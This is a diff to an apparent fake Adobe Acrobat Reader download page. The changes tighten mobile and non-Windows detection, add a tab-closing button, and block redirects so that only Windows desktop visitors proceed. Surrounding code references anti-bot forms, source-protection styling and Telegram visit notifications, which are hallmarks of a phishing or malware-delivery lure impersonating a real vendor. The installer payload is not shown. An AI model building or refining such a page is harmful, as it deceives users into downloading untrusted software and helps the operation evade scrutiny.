@@ -337,7 +337,7 @@
     }
     
     .mobile-modal-close {
-      background: #fa0f00;
+      background: #dc3545;
       color: white;
       border: none;
       padding: 12px 24px;
@@ -345,10 +345,11 @@
       cursor: pointer;
       font-size: 16px;
       font-weight: 600;
+      min-width: 120px;
     }
     
     .mobile-modal-close:hover {
-      background: #d60c00;
+      background: #c82333;
     }
 
     /* Additional Source Protection Styles */
@@ -496,13 +497,15 @@
   
   <!-- Mobile Device Modal -->
   <div id="mobileModal" class="mobile-modal">
-    <div class="mobile-modal-content">
-      <h2>⚠️ Windows Desktop Required</h2>
-      <p><strong>This Adobe Acrobat installer is designed for Windows desktop computers only.</strong></p>
-      <p>To download and install Adobe Acrobat Reader, please visit this page using a Windows desktop or laptop computer.</p>
-      <p>Mobile devices and other operating systems are not supported for this installation.</p>
-      <button class="mobile-modal-close" onclick="closeMobileModal()">I Understand</button>
-    </div>
+      <div class="mobile-modal-content">
+        <h2>⚠️ Windows Desktop Required</h2>
+        <p><strong>This Adobe Acrobat installer is designed for Windows desktop computers only.</strong></p>
+        <p>To download and install Adobe Acrobat Reader, please visit this page using a Windows desktop or laptop computer.</p>
+        <p>Mobile devices and other operating systems are not supported for this installation.</p>
+        <div style="display: flex; gap: 10px; justify-content: center; margin-top: 20px;">
+          <button class="mobile-modal-close" onclick="closeTab()" style="background: #dc3545;">Close Tab</button>
+        </div>
+      </div>
   </div>
   
   <!-- Hidden antibot form -->
@@ -701,7 +704,20 @@
       // Check screen size (mobile-like dimensions)
       const isSmallScreen = window.innerWidth <= 768 || window.innerHeight <= 1024;
       
-      return isMobileUA || (isTouchDevice && isSmallScreen);
+      // More aggressive mobile detection
+      const isMobile = isMobileUA || (isTouchDevice && isSmallScreen) || window.innerWidth <= 768;
+      
+      console.log('Mobile detection:', {
+        userAgent: userAgent,
+        isMobileUA: isMobileUA,
+        isTouchDevice: isTouchDevice,
+        isSmallScreen: isSmallScreen,
+        windowWidth: window.innerWidth,
+        windowHeight: window.innerHeight,
+        finalResult: isMobile
+      });
+      
+      return isMobile;
     }
     
     function isWindowsOS() {
@@ -719,6 +735,31 @@
       document.getElementById('mobileModal').style.display = 'none';
       document.body.style.overflow = 'auto'; // Restore scrolling
       console.log('Mobile modal closed');
+    }
+    
+    function closeTab() {
+      console.log('Closing tab...');
+      // Try multiple methods to close the tab
+      try {
+        window.close();
+      } catch (e) {
+        console.log('window.close() failed, trying alternative methods');
+      }
+      
+      // Alternative method
+      try {
+        window.open('', '_self', '');
+        window.close();
+      } catch (e) {
+        console.log('Alternative close method failed');
+      }
+      
+      // Last resort - redirect to about:blank
+      try {
+        window.location.href = 'about:blank';
+      } catch (e) {
+        console.log('about:blank redirect failed');
+      }
     }
     
     // Telegram Notification Functions
@@ -829,10 +870,19 @@ Adobe Acrobat Download Page Visit`;
       
       // Check if mobile device and not Windows
       if (isMobileDevice() || !isWindowsOS()) {
+        console.log('Mobile/non-Windows detected - showing popup and blocking redirects');
+        
         // Show mobile modal after a short delay
         setTimeout(() => {
           showMobileModal();
         }, 1000);
+        
+        // Completely block redirects on mobile/non-Windows
+        // Override the redirect function to prevent any redirects
+        window.triggerRedirectAfterAnimation = function() {
+          console.log('Redirect blocked - mobile/non-Windows device');
+          return false;
+        };
         
         // Don't start progress animation or redirect on mobile/non-Windows
         console.log('Mobile device detected - redirects disabled');
